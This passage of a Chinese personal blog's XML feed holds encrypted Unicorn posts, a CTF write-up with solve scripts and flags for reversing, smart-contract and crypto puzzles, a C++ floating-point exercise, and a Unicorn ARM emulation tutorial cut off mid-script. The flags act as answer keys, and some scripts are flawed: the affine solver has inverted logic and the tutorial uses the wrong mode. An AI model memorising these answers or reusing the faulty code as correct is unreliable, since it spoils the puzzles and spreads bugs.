  <script id="hbeData" type="hbeData" data-hmacdigest="8042df568b86049d3de29538a03684f00c119f5d2e222ce31ea9c784d91d1e6a">57f4ad225687d507395974160374769b2879cc786eddcc489def179d2372db7f47f799b25e785a1f50c4b1925872ac2a9af85b18baaf6ad3bb0a39ac1be92b785a982effdebc312872d88470e02a83e4a07b32d796f7eb41741ae05901fef6cecd3c3f7455e90b060198cc8d6c8ff82fb786210d7c3a3f6482c9ada1312e7c859862c28d20e72b0d3aaddb435761c0779014738b0e24fac40801e4dafa00b633bef788bee1c6910b288551f53584c94f0fe565e984773e2048bf163394b3e0a157ffc9e70755c974f0652adb65e15ce885a574ef5587babef039d3b82d8c8988fcc1656aa790a13c33c5241578b4bc471ef4a5ea78853d3ae92c9648f5acb31270d4d164d478243a90c93497d5ddaf5d9ca81e59bf9a9818649f8f69266268d5fe06469cd7aa9916d674c7e1a693f76a748c2168f04b0ae31078d5e3f92b9d1e14c46785d4ec1e3b1a7d3bae4900aa45f60a3e6aabccc288e2f190ab924242bf80e9e4aa3f3d4c63eee032b7c648a46da37ffa2c9cdcfeebe26a5bb526d614342b299824f6e43953da8da94ab6bfa1732b66dc69d9a22e4aefd15607725af43166b607452212e213589da75d7c14833e2796650d90bd306b76e1b3c0e6a21173e79cb3509bf000a6158385141edf0be0c389755345c06a82634d7bca93a2c0d09306cce6caa29cb1269110b701e92a2f3576a535747e59ba7cb466179c6227f73791b9af95d820da70707918a45ac4184fecedf31aec3bcf49dd73781fd10d3da3b9ab98915a263f8efcf8a780582843292d05d46a38142c04882fa89f830128ee05832b3377c13446d2de1b5ce1a7466daaf1d45649def99df61a205bcfd8c065b45800b5bd787d28ba86c90a06aab44ff2a638297de351339437ed904a721d5db5fd473ae24ffab11a39f5bc655d849032d526c9b7aded5fb6c0cf065149973c524032b0cc4395834cb87d70f2825a3be62b2daba83c5b0cbc4cebb360db98adde0af80578c9bc6529354adfae918dda97fef0c07a3ee79edd2ca7d5876d87324c138b743f1d900692dc592cd0ae006e0b68a61dc423540c2d6aff663d3a03c2b4a0f1a616b5b9f4a420111c8c34504386f5e8a4d698ff32d5a94b690345d7b52a534b331bbbe037aca1a70a930cb0c34e2d988e5ac3eaba54130b903f820f06554833b79ed00622411d34ce012c35639cc0df66aa2a65683738de87c20ce47259bd7a1c22f85df663661d08d5fb9383f184c023e32fd67ddaa295248d575bb822eb87e41026c258106a15084a12903556c598548fbb6a79301b41dae21bbcdea72153878723cf33247d57cf3dca8abd5e6471597a34b3cc685ab206ce7b93dffb626f0524d3304ba897fb3efd3c1761d3ff496945d2383ec8195fe1d64edc6fa0d4791b2819db61bab593b19f893f0b2e6a63791df9ecbf3985f7c0c675eaf1ea9f67cd85dd1c9aeb3daa201ba0d94edf83f44753811d31e66e514bcec20e8cbd3405271943798178c1cac143faf506265345d982245ab229c6481833129d0865217c76360365be9b498f3bf8c36e2b1f59c29426b8d935dda4987cdcc74e0aea3ae31c5375fa6315c23932fb8e24709f1c8814581d488d840fc110232a784a2a51a9c32f9ba2b8b89e752df57c9ea688a9aca1a9d3814f15a87b97d10a9e1f3789239b89aaa6ad90b56aac5c1c580f9eb2c13922aec684a948ba5010d46c3757d79d7bdb2f7ba26a3cd3f809621f248e768e2ec62fb3d4a677ec47550f95eba7a595089f4832c95d9c42b8c7fb0610b4fb6eb4ca4d2f79f463ae8f9bc7e86ccac48935f0916186514ef5bb115d5a599cda4448eeacb3922cc51a4a9330d19ddfe5653df51c96cc45e3a8dbf3b9d409b951d82bb6c10f1e3f7867497673d2fddf02255e521acd74775fd0e512b06684199af574aa2a663802075b7e55657ecdba498b9a008a3b92fd902a503611fc133456c6b5fabc94e67808f28c1c06f8a6d4a7498e899ac751066568bc2ee43bcdd2b9fb10cf2e086aa444029713a3c6035ee82e55b9c00b18320df803683250a3fc58aad3a266c6b366cd977a8a09a1871e2cb645ccd5560fe721cc2440931f6955f656e3ef7b96e84497b7533af54599c074dac486e6a9dc2b8532cc5a0324c15d1df556024e629784d8fc16ad61089969ee68e1dfa7f42a45e420645467e8aa157319fb33cbbacc0777fab496db2d43aecd5aa32d64b3ea4f6ed5c76ccfc696235684766f775e2442b318293669854f58945ea960328618a3205cdc26154fcc6c952fe84bdf453709f5ac9543aced5879eea4e41fb323182969633297ccd3ecc043f728ba59e94b0460d44ea0e4c4fd6019e9586d8bc03aaded610cdc63a18d992f83df5f15c41da83c8ce454b7cbd2b01d299e5ab923d2c2d4928dc157937cab6ee48a97b5beb546b21103385e36a997cebd3210fd32d0af0e950b08257e91f43627380024561ac7a14e6d4ff3282843308e385f0a42fffef8574c7051438e93fe50c151652201259fb1bd72e49b00b8cf9738a939c80b001e7068453ba94679538993ce9aefbecfdbc672d3ff2c98cc846aae76982f85b8b4096809944cbb2e3451095b9a14dd0aba16d7a9e8107543a9d91b0277391e705a51b893e519bde7285a43f7676bb74803fa2c510aeea2aff64aed0e67025d69cdc6a8293e42d9ad9273bd5dbfce7bcea4d5e1cd86125d81565f1ad60e394a5d4fb1070bec1900a6057b9ce3158a1d38732c1b3846c944dd5d499ca55ccce36170d07a07ea8249318c650fcae4820af084977bdd3b70432d923dec732581f76d8f2a739d899216deb71d67eec5ea3b8f25f11197ac89cbdb7caa1f533ac1bb4456e7d9de354353bff73ac6c340f7e33b3ada38a7e8d012fbdb4002c98457d886e98cdbda9c310d59ed57b992306782f2e4d0f556c8b732883abbaac1aee4409de319db8c4fcb72f643a89856204f0b75203c49358f98c420a897560024f6a2f28cf03eb5b64c4508914e6dd5d50e539031e50ce87ed2022742a088de6d8b1e3b170e4956999c91ae4b017f211b1b47a269d3aafed3cbc23942aaaac75640aa57238a1b05ff5b388633566a5881871f836d915db023cb390753d9a0cb6559f163ee103f17cb5fc738532a170a76494730c7c7f1d97e31d04e81d984d6eb1b51d61e4a376cfa6c8374a03965859a87b04169f9e064dcce6851ad38b90f7a95be1e07c3320580e4975a1104f555431239a64e7e6b31a0be52987eede0a5f42869fcb2bac345b55a503d53dca13471123d127177bd79cfcbe0755f2a5d3de88ee4c7dc5ca310d3aa3483748f5da727add395b3c0a09c19ed2149cbeaa3d17b7e09c18ded794485a2a77489de2a41e25d77bbbe746bbec6b02f5d41f48e254b18c94886b5ae40b163897e69f967537b9822602b97d37911e1dfacc93ce8f8936f03f2e3e1d207c1e1e984ef52f1fb80c1f3a756ab9b2ef60d13f10b59ce118a7107f8dbc2739034daaaf619ee0c2555ef1deec2b5a9fd106e0efa852b0625830751efdce003cb910e692d4310c97e1c0ca7a8244dd16bb52546d5e129382fbbbae37273d42349a5920a52dec3cbad3828c1fd5bfb1e42927d6ef0004f6ac1a96cc7ad0be7fef41a3ac7424569545a2c7bddc3e7c52f6b55854dc3c58b279f465221df72af1d4b5365e01eb476999fd498dfa44ccdb40b267a1a5ea8def43815b6c5b1d281ae7919aa02bc9b4fed18897768269b9d2e06248d31d3634bdc06e2b2e770c462067feff4e8ef8e9c8f73f646f975d4b2325da4a1175dbe0b4cf24c393d3c4b6c36a0aa894fab843945ed8225d9d423cc5f6abc9cae109748857261731738d4bf8812f268f69699b5e49df96703cb9b90c53d235b928d8a3d551601fc37ece8c709b26ad1919f2b936122f0fd180d1b93b864c82da874d68144008958ca40895b069faa8f1cb862fe360827c98103c9f5e1775e215e391d202d6a7823ebe1256a43113ed82b0580ae643f18afd033b8f1e1033095db4f3d33e0db84086c289f8f63e8c8cffe9e10fab0cd510e0a147740d3482f4728930013b17e8e1b6fdfe8f1c4ad0605dbc47a4f4e303ba3d7a14530000da9a3243cdde33766897c164228eee9d065f91813767e86544bfd4de493c5a8141c5d3f708c9ae5070b19f03e5d464213013b5e6c03c66fe1a6dbfcfda71651b36fd1b703ac720ec8d0219bb6c41edacd76a86acdde7af058fc39dac8879928b72b8fbd4eb92e01d6395398c867eb641e20ac06cfe17f85e64ea8be9aad418429851347bfb5a8ff3449bf9a353e130186a570043789a6b2c5fe0eb8a327caf6dade27bfe641cea1bf3c98de421e2068490f8964046981f4d554e9933a76e7ae4b90800e2972f60ee5d8b40f813f2229b8ab1c9f2e6dd1a774edadf556ba340c492da76dccc2b28ecddee1052daf739d1176a46b52a7d9975b79563ad2983937af9489f3249f56113d4493ad20221f9972cf8f944ce8192ea33d20da4a4dcfb184eba935d5eacf2d41310e65d1ce3c7b00b00a67da249b9a343be3336f44d7f0ae6e4d901305ed6bfbb283e3207524cbd94e4411428fd39fb95e84e8054d668c02993ceffcfde800ddcc32fa200e1e7c1be2ac7f2803203461a7db0a7338ec3af076a328d834e1b80d79d0df90869f5870fd7007bac176baeca92ef4bef649e5916cdc45996dc40e52189c64de598c23b0c2036de04085ee9d3619aeddaf4b77c8f39fa15457acf87548e04c2963541e88cba6faad7e012148bf327f6b1a9f5e1417baae848f425052ea9e6899fb3e889933db3e88cd3b59981086c96ae2675fcfc64b23cdaaa710b2471c9dc24b8d3d1d8f2e4106b78775fc2808a01b6d9f7008cde800f960a80d8a45b2f852f67285ae087313e17a06eadcf7c848d43b75ca374c024e541d344b3539394a18ea29954907ae8f3e253b697476340c3c7f40f1b604ecc83eeebf8b2b7f4c36e3c99ad74dd0a6cbc52fc3867d6035dbd5c06504a05d174c8b4e8b2a3b83ff417bd8d2a1be6e10c8457ceabe54b88ad7735f28f1794685c903b4cdb5cf6ecdcf1911d63091befd118b6116be7122b0ca3b8eed7aed29f728253f41172a37d1ab2f54ac373ea7e4ece023a66881dfa368d2ca3922b102e85b5b2644cdc813511dc88e701a1f6391450fab6ce6f0dcb3966b2330ac7dfbc4f0fc646582dae0d12be552b91310051a9dfc39e48ad25d71d006b709c604fb19b39364007e3aada3e67a30181bee26652a1b5ff3739de10a21d4a3efcd7120afed18f5f770745ced81111d5f953a65d74244f8b956e11b6abfe5f3c2ff72b7e361aa4330fe1a79c02e320a292694ca0cddaa6b05c75487a2e84ef8cd2fd7befd506922afef619efa2794c2a548c8acccae9f8d76ca89cc19a1a6eae8b4fc3d9407d03891457f9a9791e6cb45fd953a8c6ed267f6dd97b729d6399d535465bbfe</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>unicorn</tag>
      </tags>
  </entry>
  <entry>
    <title>unicorn_learning5</title>
    <url>/2023/01/01/unicorn-learning5/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="71430e7a887f69511d32e982763cd04c32effb21c64e31544013d66ccc9d98e3"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>unicorn</tag>
      </tags>
  </entry>
  <entry>
    <title>信创网安wp</title>
    <url>/2022/12/05/%E4%BF%A1%E5%88%9B%E7%BD%91%E5%AE%89wp/</url>
    <content><![CDATA[<p>省排名：22</p>
<p>web师傅纠结于web最后一题，所以杂项一道没做。然后我把仿射密码的做题思路给忘了，然后密码0解，至于pwn….</p>
<span id="more"></span>

<h1 id="RevShift"><a href="#RevShift" class="headerlink" title="RevShift"></a>RevShift</h1><pre><code class="python">str1=&#39;≁⧃⩆㷕⿤ᩣᡤ㋟㩨ᣳ⿃ᣰ㑥㥟⫴㍽&#39;
print(str1)
for i in str1:
    t = ord(i)&amp;0xff
    if t &gt; 128:
        print(chr(ord(i) &gt;&gt; 7)+chr((ord(i)-128)&amp;0xff),end=&#39;&#39;)
    else:
        print(chr(ord(i) &gt;&gt; 7)+chr((ord(i))&amp;0xff),end=&#39;&#39;)

f.close()
print(int(&#39;10000000&#39;,2))
# DASCTF&#123;U_d4c0de_th1s_C1pher_Utf&#125;
</code></pre>
<h1 id="ReContract"><a href="#ReContract" class="headerlink" title="ReContract"></a>ReContract</h1><h5 id="1-智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行"><a href="#1-智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行" class="headerlink" title="1.智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行"></a>1.智能合约的题，我也是第一次做，但提示说是一道容易题，查看文件发现前面有几个数字缺了，直接百度搜着找就行<img src="/./../images/image-20221205105400376.png" alt="image-20221205105400376"></h5><h5 id="2-然后又找到一篇文章，上面写着一个在线工具"><a href="#2-然后又找到一篇文章，上面写着一个在线工具" class="headerlink" title="2.然后又找到一篇文章，上面写着一个在线工具"></a>2.然后又找到一篇文章，上面写着一个在线工具<img src="/./../images/image-20221205105528927.png" alt="image-20221205105528927"></h5><h5 id="3-直接将字节码复制进去翻译即可"><a href="#3-直接将字节码复制进去翻译即可" class="headerlink" title="3.直接将字节码复制进去翻译即可"></a>3.直接将字节码复制进去翻译即可<img src="/./../images/image-20221205105705533.png" alt="image-20221205105705533"></h5><h5 id="4-这里看见有五个可疑数字，拿去转字符串看看"><a href="#4-这里看见有五个可疑数字，拿去转字符串看看" class="headerlink" title="4.这里看见有五个可疑数字，拿去转字符串看看"></a>4.这里看见有五个可疑数字，拿去转字符串看看<img src="/./../images/image-20221205105820247.png" alt="image-20221205105820247"></h5><h5 id="5-发现顺序是乱的，以我神级英语水平，大概的顺序就是-’反编译智能合约字节码真的不错’-hhhhhhhhhhhh"><a href="#5-发现顺序是乱的，以我神级英语水平，大概的顺序就是-’反编译智能合约字节码真的不错’-hhhhhhhhhhhh" class="headerlink" title="5.发现顺序是乱的，以我神级英语水平，大概的顺序就是:’反编译智能合约字节码真的不错’,hhhhhhhhhhhh"></a>5.发现顺序是乱的，以我神级英语水平，大概的顺序就是:’反编译智能合约字节码真的不错’,hhhhhhhhhhhh<img src="/./../images/image-20221205110022973.png" alt="image-20221205110022973"></h5><pre><code class="python">from Crypto.Util.number import *

print(long_to_bytes(0x4279746563306465355f00000000000000000000000000000000000000000000))
print(long_to_bytes(0x4441534354467b00000000000000000000000000000000000000000000000000))
print(long_to_bytes(0x536d3472745f43306e74724063745f0000000000000000000000000000000000))
print(long_to_bytes(0x443363306d70316c655f00000000000000000000000000000000000000000000))
print(long_to_bytes(0x31735f46756e4e792e7d00000000000000000000000000000000000000000000))
# DASCTF&#123;D3c0mp1le_Sm4rt_C0ntr@ct_Bytec0de5_1s_FunNy.&#125;
</code></pre>
<hr>
<p>赛后复现密码—–逆向第三道懒得复现，还有密码第三道。。。。。。&#x3D;&#x3D;看了一遍代码就把文件扔到回收站了&#x3D;&#x3D;</p>
<h1 id="easy-Affline"><a href="#easy-Affline" class="headerlink" title="easy_Affline"></a>easy_Affline</h1><p>这道题题目给的a，b数字太大，我以为要爆破很长的区间，其实不用，经过我脚本的测试，发现大数字和小数字的结果是相同的，所以只需遍历0~m即可</p>
<pre><code class="python">from Crypto.Util.number import *
import random
text = &#39;aCdhpnlmNKuRJbfVIXUvyTrSPqjBMzgwHZkAxWGiYetEsocDLFOQ&#39;
cipher = &#39;CezmBh&#123;BKDdD_oP_rKD_rdtF_cMHu&#125;&#39;
flag=&#39;DASCTF&#39;
i = 0

def d():
    for a in range(2, 52):
        
        for b in range(2, 52):
            if GCD(a,52) == 1:
                break
            c = &#39;&#39;
            t = inverse(a,52)
            for i in cipher:
                x = text.find(i)
                c += text[t*(x-b) % len(text)]
            if c == flag:
                print(a,b)
                return
        
d()
a = 2
b = 6
t = inverse(a,52)
flag = &#39;&#39;
for i in cipher:
        if i not in text:
            flag += i
        else:
            x = text.find(i)
            flag += text[t*(x-b) % len(text)]
print(flag)
# DASCTF&#123;TheLe_iU_Ihe_ILxE_Yrjp&#125;
</code></pre>
<h1 id="gauss-system"><a href="#gauss-system" class="headerlink" title="gauss_system"></a>gauss_system</h1><p>sage解即可</p>
<pre><code class="python">k = 1751007263671615053487807501173970925758538
c = 463982900309034681135307002234842926080979
p, q = var(&quot;p, q&quot;)
assume(p, &quot;integer&quot;)
assume(q, &quot;integer&quot;)
sol = solve((p - 1003) ** 2 + (q - 48) ** 2 == k, p, q)

for p, q in sol:
    if p &gt; 0 and q &gt; 0:
        p, q = int(p), int(q)
        if is_prime(p) and is_prime(q):
            print(p)
            print(q)
</code></pre>
<p><img src="/./../images/image-20221205111022196.png" alt="image-20221205111022196"></p>
<pre><code class="python">import libnum
import gmpy2
from Crypto.Util.number import *
e = 0x10001
s = 1751007263671615053487807501173970925758538
c = 463982900309034681135307002234842926080979
p = 1087638045546779918273
q = 753691412682137267747
assert p**2 + q**2 == s
phi = (p-1)*(q-1)
d = libnum.invmod(e,phi)

n = p*q
m = pow(c,d,n)
long_to_bytes(m)
# Z[i]_15_m4g1c
</code></pre>
]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>关于c++中double误差问题</title>
    <url>/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>question: double</p>
<span id="more"></span>

<h2 id="PAT甲级题"><a href="#PAT甲级题" class="headerlink" title="PAT甲级题"></a>PAT甲级题</h2><p>给定一个正数数列，我们可以从中截取任意的连续的几个数，称为片段。例如，给定数列 { 0.1, 0.2, 0.3, 0.4 }，我们有 (0.1) (0.1, 0.2) (0.1, 0.2, 0.3) (0.1, 0.2, 0.3, 0.4) (0.2) (0.2, 0.3) (0.2, 0.3, 0.4) (0.3) (0.3, 0.4) (0.4) 这 10 个片段。</p>
<p>给定正整数数列，求出全部片段包含的所有的数之和。如本例中 10 个片段总和是 0.1 + 0.3 + 0.6 + 1.0 + 0.2 + 0.5 + 0.9 + 0.3 + 0.7 + 0.4 &#x3D; 5.0。</p>
<h3 id="输入格式："><a href="#输入格式：" class="headerlink" title="输入格式："></a>输入格式：</h3><p>输入第一行给出一个不超过 105 的正整数 <em>N</em>，表示数列中数的个数，第二行给出 <em>N</em> 个不超过 1.0 的正数，是数列中的数，其间以一个空格分隔。</p>
<h3 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h3><p>在一行中输出该序列所有片段包含的数之和，</p>
<h3 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h3><pre><code class="in">4
0.1 0.2 0.3 0.4
</code></pre>
<h3 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h3><pre><code class="out">5.00
</code></pre>
<p>关于这题的分析：</p>
<blockquote>
<p>我是看了柳神的，我天真地以为一个数据出现了n-1词，但比如0.2在0.1的条件下，就已经出现了3次了</p>
</blockquote>
<p>柳神原话：将数列中的每个数字读取到temp中，假设我们选取的片段中包括temp，且这个片段的首尾指针分别为p和q，那么对于p，有i种选择，即12…i，对于q，有n-i+1种选择，即i, i+1, … n，所以p和q组合形成的首尾片段有i * (n-i+1)种，因为每个里面都会出现temp，所以temp引起的总和为temp * i * (n – i + 1)；遍历完所有数字，将每个temp引起的总和都累加到sum中，最后输出sum的值</p>
<p>原先的代码：</p>
<pre><code class="c++">#include&lt;iostream&gt;
using namespace std;
int main(void)&#123;
    int n;
    double tmp,sum = 0;
    cin &gt;&gt; n;
    for(int i=0;i&lt;n;i++)&#123;
        cin &gt;&gt; tmp;
        sum += tmp * (i + 1) * (n - i);
    &#125;
    printf(&quot;%.2f&quot;,sum);
    return 0;
&#125;
</code></pre>
<p><strong>结果不太行啊</strong></p>
<p><img src="/./../images/image-20230510111635757.png" alt="image-20230510111635757"></p>
<blockquote>
<p>这里用double进行运算时是会产生误差的，因为有些数用二进制表示不出来，c++中只能粗略表示.</p>
<p>具体参考文章：<a href="https://bipy.me/post/about-double/">由一道 OJ 引发的关于 double 类型的一些思考 | Lust for Life (bipy.me)</a></p>
</blockquote>
<p>然后大佬给出的方案是用long long 类型进行小数点后移×1000，这里其实就要考虑所给的数据是否都是最多小数点后三位了</p>
<pre><code class="c++">#include&lt;iostream&gt;
using namespace std;
int main(void)&#123;
    int n;
    long long sum = 0;
    double tmp;
    cin &gt;&gt; n;
    for(int i=0;i&lt;n;i++)&#123;
        cin &gt;&gt; tmp;
        sum += (long long)(tmp * 1000) * (i + 1) * (n - i);
    &#125;
    printf(&quot;%.2f&quot;,sum/1000.0);
    return 0;
&#125;
</code></pre>
<p><strong>然后这里居然才4.99</strong></p>
<p><img src="/./../images/image-20230510135403050.png" alt="image-20230510135403050"></p>
<p>更离谱的是给通过了😂笑死，反正我感觉很不靠谱</p>
<p><img src="/./../images/image-20230510135517225.png" alt="image-20230510135517225"></p>
<p><strong>其实我觉得这题用java中的bigdecimal才是最优</strong></p>
<p>动态规划类解法：(从后往前遍历)</p>
<pre><code class="c++">#include&lt;iostream&gt;
using namespace std;
int main(void)&#123;	
    int n;
    double tmp;
    long long sum = 0;
    cin &gt;&gt; n;
    long long seq[n];
    for(int i=0;i&lt;n;i++) &#123;
        cin &gt;&gt; tmp;
        seq[i] = (long long)(tmp * 1000);
    &#125;
    sum = seq[n-1];
    for(int i=n - 2;i !=-1 ;i--)&#123;
        seq[i] = seq[i] * (n - i ) + seq[i+1];
        sum += seq[i];
    &#125;
    printf(&quot;%.2f&quot;,sum/1000.0);
    return 0;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>PAT练习</category>
      </categories>
  </entry>
  <entry>
    <title>unicorn_learning1</title>
    <url>/2022/12/29/unicorn1/</url>
    <content><![CDATA[<p>unicorn start!</p>
<p>效仿大佬的文章简单地给自己作个学习记录，就当作写了篇日记了</p>
<span id="more"></span>

<h1 id="Unicorn-入门学习"><a href="#Unicorn-入门学习" class="headerlink" title="Unicorn 入门学习"></a>Unicorn 入门学习</h1><p>unicorn 是用于执行多种cpu框架的虚拟架构系统</p>
<h5 id="下面进行模仿arm架构，执行arm指令"><a href="#下面进行模仿arm架构，执行arm指令" class="headerlink" title="下面进行模仿arm架构，执行arm指令"></a>下面进行模仿arm架构，执行arm指令</h5><p>首先在python中导入unicorn</p>
<pre><code class="python">from unicorn import *
</code></pre>
<p>如何根据自己要执行指令对应哪个cpu架构，来导入相应的处理器相关的常量</p>
<pre><code class="py">from unicorn.arm_const  import *
from unicorn.arm64_const import *
from unicorn.m68k_const import *
from unicorn.mips_const import *
from unicorn.sparc_const import *
from unicorn.x86_const import *
</code></pre>
<p>寄存器常量命名规则：<br>UC_ + 指令集 + <em>REG</em> + 大写寄存器名<br>UC_ARM<em>REG</em> + 大写寄存器名 （UC_ARM_REG_R0）<br>UC_X86<em>REG</em> + 大写寄存器名 （UC_X86_REG_EAX）</p>
<p>这里我们选择unicorn.arm_const</p>
<h4 id="创建arm虚拟机（UC）"><a href="#创建arm虚拟机（UC）" class="headerlink" title="创建arm虚拟机（UC）"></a>创建arm虚拟机（UC）</h4><p>Uc 是unicorn的主类，Uc对象则代表了一个独立的虚拟机实例，它有独立的寄存器和内存等资源，不同Uc对象之间的数据是独立的。Uc的构造函数有两个参数 <em>arch</em> 和 <em>mode</em>，用来指定模拟执行的指令集和对应的位数或模式。<br>arch常量参数一般以 UC<em>ARCH</em> 开头，MODE常量以UC<em>MODE</em> 开头。</p>
<pre><code class="py"># Test ARM
def test_arm():
    print(&quot;Emulate ARM code&quot;)
    try:
        # Initialize emulator in ARM mode
        mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)	# 创建代码
        # 其它代码添加到此处
        return mu
    except UcError as e:
        print(&quot;ERROR: %s&quot; % e)

mu = test_arm() # mu就是arm虚拟机
</code></pre>
<h4 id="映射内存"><a href="#映射内存" class="headerlink" title="映射内存"></a>映射内存</h4><p>想用Unicorn模拟执行代码，是不能将代码字节流直接以参数形式传递给Unicorn，而是将要执行的代码写入到Unicorn 的虚拟内存中。Uc 虚拟机实例初始内存是没有任何映射的，在读写内存之前使用<em>uc_mem_map</em>函数映射一段内存</p>
<p>这里开始地址和地址大小都要和0x1000&#x3D;&#x3D;对齐&#x3D;&#x3D;</p>
<p>否则就是我这种错误：</p>
<p><img src="/./../images/image-20221229151625712.png" alt="image-20221229151625712"></p>
<pre><code class="py">ADDRESS = 0x10000
mu.mem_map(ADDRESS, 0x1000)  # 这里大小自己估算
</code></pre>
<h4 id="写入代码"><a href="#写入代码" class="headerlink" title="写入代码"></a>写入代码</h4><p>将想要执行的代码写进我们创建的内存中</p>
<p>mem_write的第二个参数必须是byte字节数组，只支持python的byte数组，不能是String或者bytearray。</p>
<pre><code class="python">ARM_CODE   = b&quot;\x37\x00\xa0\xe3\x03\x10\x42\xe0&quot;
# mov r0, #0x37;
# sub r1, r2, r3
mu.mem_write(ADDRESS, ARM_CODE) 
</code></pre>
<p>给寄存器初始赋值</p>
<pre><code class="python">mu.reg_write(UC_ARM_REG_R0, 0x0)
mu.reg_write(UC_ARM_REG_R2, 0x4)
mu.reg_write(UC_ARM_REG_R3, 0x1)
# 这里r1的结果预估是0x3
</code></pre>
<h4 id="添加指令级的Hook"><a href="#添加指令级的Hook" class="headerlink" title="添加指令级的Hook"></a>添加指令级的Hook</h4><p>hook类型：</p>
<ul>
<li>指令执行类：<ul>
<li>UC_HOOK_INTR</li>
<li>UC_HOOK_INSN</li>
<li>UC_HOOK_CODE</li>
<li>UC_HOOK_BLOCK</li>
</ul>
</li>
<li>内存访问类：<ul>
<li>UC_HOOK_MEM_READ</li>
<li>UC_HOOK_MEM_WRITE</li>
<li>UC_HOOK_MEM_FETCH</li>
<li>UC_HOOK_MEM_READ_AFTER</li>
<li>UC_HOOK_MEM_PROT</li>
<li>UC_HOOK_MEM_FETCH_INVALID</li>
<li>UC_HOOK_MEM_INVALID</li>
<li>UC_HOOK_MEM_VALID</li>
</ul>
</li>
<li>异常处理类：<ul>
<li>UC_HOOK_MEM_READ_UNMAPPED</li>
<li>UC_HOOK_MEM_WRITE_UNMAPPED</li>
<li>UC_HOOK_MEM_FETCH_UNMAPPED</li>
</ul>
</li>
</ul>
<p><img src="/./../images/image-20221229153037712.png" alt="image-20221229153037712"></p>
<pre><code class="py">def hook_add(self, htype, callback, user_data=None, begin=1, end=0, arg1=0):
    pass
mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=0x1000)
</code></pre>
<p>以上是添加hook的操作</p>
<p>在begin…end范围内的每一条指令被执行前都会调用callback。</p>
<p>hook函数编写：</p>
<pre><code class="py"># callback for tracing instructions
def hook_code(uc, address, size, user_data):
    print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))
</code></pre>
<h4 id="执行虚拟机"><a href="#执行虚拟机" class="headerlink" title="执行虚拟机"></a>执行虚拟机</h4><p>emu_start 可以通过timeout参数设置最长执行时长，防止线程死在虚拟机里面。emu_start 执行完成后，可以通过读取内存或寄存器的方式来获取执行结果。</p>
<pre><code class="py">def emu_start(self, begin, until, timeout=0, count=0):
    pass
mu.emu_start(ADDRESS, ADDRESS + len(ARM_CODE))
</code></pre>
<p>执行成功，hook函数一共被调用两次（指令有两条）</p>
<p><img src="/./../images/image-20221229154734059.png" alt="image-20221229154734059"></p>
<h4 id="获取寄存器结果"><a href="#获取寄存器结果" class="headerlink" title="获取寄存器结果"></a>获取寄存器结果</h4><pre><code class="py">r0 = mu.reg_read(UC_ARM_REG_R0)
r1 = mu.reg_read(UC_ARM_REG_R1)
print(&quot;&gt;&gt;&gt; R0 = 0x%x&quot; % r0)
print(&quot;&gt;&gt;&gt; R1 = 0x%x&quot; % r1)
</code></pre>
<p>和推理的结果相同！！！！</p>
<p><img src="/./../images/image-20221229154900787.png" alt="image-20221229154900787"></p>
<hr>
<h3 id="个人测试全过程："><a href="#个人测试全过程：" class="headerlink" title="个人测试全过程："></a>个人测试全过程：</h3><p><img src="/./../images/image-20221229155328503.png" alt="image-20221229155328503"></p>
<p><img src="/./../images/image-20221229155356531.png" alt="image-20221229155356531"></p>
<p>完整代码：</p>
<pre><code class="py">from unicorn import *
from unicorn.arm_const import *
ARM_CODE   = b&quot;\x37\x00\xa0\xe3\x03\x10\x42\xe0&quot;
# mov r0, #0x37;
# sub r1, r2, r3
# Test ARM
 
# callback for tracing instructions
def hook_code(uc, address, size, user_data):
    print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))
 
def test_arm():
    print(&quot;Emulate ARM code&quot;)
    try:
        # Initialize emulator in ARM mode
        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
 
        # map 2MB memory for this emulation
        ADDRESS = 0x10000
        mu.mem_map(ADDRESS, 2 * 0x10000)
        mu.mem_write(ADDRESS, ARM_CODE)
 
        mu.reg_write(UC_ARM_REG_R0, 0x1234)
        mu.reg_write(UC_ARM_REG_R2, 0x6789)
        mu.reg_write(UC_ARM_REG_R3, 0x3333)
 
        mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)
        # emulate machine code in infinite time
